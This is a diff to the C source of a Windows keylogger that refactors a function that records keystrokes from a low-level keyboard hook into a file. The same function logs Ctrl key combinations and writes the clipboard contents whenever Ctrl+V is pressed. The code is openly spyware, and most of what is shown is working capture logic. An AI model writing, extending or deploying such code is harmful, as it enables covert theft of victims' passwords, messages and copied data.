@@ -5,24 +5,23 @@
 #include "keylogger.h"
 #include <stdio.h>
 
-// TODO: proper comments, and in header only...?
-// Logs the respective characters of the provided KBD hook.
-void log_kbd(const KBDLLHOOKSTRUCT* kbd_hook) {
+errno_t log_kbd(const KBDLLHOOKSTRUCT* kbd_hook) 
+{
 	if (is_ignored(kbd_hook->vkCode))
-		return;
+		return 1;
 
 	FILE* out_file;
-	errno_t err = fopen_s(&out_file, OUT_FILE, "a");
+	errno_t rc = fopen_s(&out_file, OUT_FILE, "a");
 
-	if (err)
-		return;
+	if (rc)
+		goto out;
 
-	LPCWSTR code_value = get_key_value(kbd_hook->vkCode);
+	LPCWSTR vk_val = get_key_value(kbd_hook->vkCode);
 
-	if (code_value != NULL) {
-		fwprintf(out_file, code_value);
+	if (vk_val != NULL) {
+		rc = fwprintf_s(out_file, vk_val);
 	} else if (is_key_down(VK_CONTROL)) {
-		fwprintf(out_file, L"[CTRL + %l]", (WCHAR)kbd_hook->vkCode);
+		rc = fprintf_s(out_file, "[CTRL + %c]", (CHAR)kbd_hook->vkCode);
 
 		if (kbd_hook->vkCode == VK_V)
 			write_clipboard_data(out_file);
@@ -30,11 +29,17 @@ void log_kbd(const KBDLLHOOKSTRUCT* kbd_hook) {
 		WCHAR key_buff[KEY_BUFFER_SIZE];
 
 		if (kbd_to_unicode(kbd_hook, key_buff, KEY_BUFFER_SIZE) > 0)
-			fwprintf_s(out_file, key_buff);
+			rc = fwprintf_s(out_file, key_buff);
 	}
+
+close:
+	fclose(out_file);
+out:
+	return rc;
 }
 
-BOOL is_ignored(DWORD vk_code) {
+BOOL is_ignored(DWORD vk_code) 
+{
 	switch (vk_code) {
 	case VK_LCONTROL:
 	case VK_RCONTROL:
@@ -45,7 +50,8 @@ BOOL is_ignored(DWORD vk_code) {
 	}
 }
 
-LPCWSTR get_key_value(DWORD vk_code) {
+LPCWSTR get_key_value(DWORD vk_code) 
+{
 	switch (vk_code) {
 	case VK_RETURN:
 		return L"\n";
